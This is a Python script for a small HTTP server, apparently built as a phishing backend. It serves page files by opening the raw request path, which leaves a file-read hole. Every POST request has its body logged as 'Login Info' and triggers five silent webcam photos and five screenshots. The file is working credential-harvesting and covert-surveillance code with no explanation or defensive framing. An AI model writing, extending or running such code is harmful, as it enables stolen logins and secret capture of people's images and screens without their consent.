from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import os
import time
import cv2
from PIL import ImageGrab


class PhotoTakerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        try:
            file_to_open = open(self.path[1:], 'rb').read()
            self.send_response(200)
        except FileNotFoundError:
            file_to_open = b"File not found"
            self.send_response(404)
        self.end_headers()
        self.wfile.write(file_to_open)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"Requested URL: {self.path}")
        print(f"Login Info: {post_data}")
        print(f"Device Info: {socket.gethostname()}")
        print(content_length)

        # Capture and save photos
        photo_folder = 'captured_photos'
        os.makedirs(photo_folder, exist_ok=True)

        camera = cv2.VideoCapture(0)  # Open the default camera (usually the built-in webcam)
        for i in range(5):
            ret, frame = camera.read()
            if ret:
                photo_path = os.path.join(photo_folder, f"photo_{i + 1}.png")
                cv2.imwrite(photo_path, frame)
                print(f"Captured photo saved at: {os.path.abspath(photo_path)}")
            else:
                print(f"Error capturing photo {i + 1}")

        camera.release()  # Release the camera
        cv2.destroyAllWindows()  # Close any open windows


        
         # Create a new folder for photos
        photo_folder = 'Screen_shot'
        os.makedirs(photo_folder, exist_ok=True)

        # Capture and save photos
        for i in range(5):
            photo_path = os.path.join(photo_folder, f"photo_{i + 1}.png")
            ImageGrab.grab().save(photo_path)
            print(f"Captured photo saved at: {os.path.abspath(photo_path)}")

        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        print(f"Requested URL: {self.path}")


def run(server_class=HTTPServer, handler_class=PhotoTakerHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    print('Starting at: http://localhost:8000')
    httpd.serve_forever()
    
run()
